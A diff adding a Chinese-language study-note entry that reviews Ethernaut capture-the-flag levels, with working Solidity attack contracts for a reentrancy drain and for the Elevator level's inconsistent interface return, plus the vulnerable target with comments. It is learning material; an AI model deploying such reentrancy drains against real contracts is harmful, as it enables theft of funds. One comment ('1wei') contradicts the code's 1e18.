@@ -63,9 +63,77 @@ timezone: Pacific/Auckland # 新西兰标准时间 (UTC+12)
 
 <!-- Content_START -->
 
-### 2024.07.11
+### 2024.08.29
 
-笔记内容
+回顾了一下ethernaut前面的题目：
+11. 
+pragma solidity ^0.7;
+interface IReentrancy {
+    function donate(address) external payable;
+    function withdraw(uint256) external;
+}
+contract Hack { 
+    IReentrancy private immutable target;
+    constructor(address _target){
+        target =IReentrancy(_target);
+    }
+    function attack() external payable{
+        //这个合约一开始先给被攻击合约转入1wei
+        target.donate{value:1e18}(address(this));
+        //这个用法表达的意思为调用这个函数并且传递自己合约的地址
+        target.withdraw(1e18);
+        require (address(target).balance==0,"target balance>0");
+        selfdestruct(payable(msg.sender));
+    }
+    receive() external payable{
+        uint amount=min(1e18,address(target).balance);
+        if(amount>0){
+        target.withdraw(amount);//这里再重入攻击
+        }
+    }
+    function min(uint x,uint y) private pure returns (uint){
+        return x<=y?x:y;
+    }
+}
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+    contract Hack {
+        Elevator private immutable target;
+        uint private count=0;
+        constructor(address _target){
+            target=Elevator(_target);
+        }
+        function pwn()external {
+            target.goTo(1);
+            require(target.top(),"not top");
+        }
+        function isLastFloor(uint) external returns (bool){
+            count++;
+            return count>1;
+        }
+        
+    }
+
+12. 
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+//这边这个合约的接口是一个判断是不是顶楼的，这边其实不重要
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+//这边给Building的接口了一个地址--就是攻击合约的地址
+    if (! building.isLastFloor(_floor)) {//由于这里没有对这个函数定义，所以自己写一个合约来进行攻击
+      floor = _floor;
+      top = building.isLastFloor(floor);//这题判断是不是成功就是看这个地方top的值是不是true
+    }
+  }
+}
 
 ### 2024.07.12
 
